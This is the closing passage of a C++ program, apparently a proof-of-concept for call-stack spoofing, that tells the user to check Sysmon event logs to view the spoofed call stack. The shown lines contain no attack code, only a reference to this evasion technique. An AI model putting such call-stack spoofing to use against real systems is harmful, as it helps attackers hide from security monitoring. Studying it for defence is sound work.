        std::cout << "[+] Check SysMon event logs to view spoofed callstack: Applications and Services --> Microsoft --> Windows --> Sysmon \n";
    }
    return 0;
}

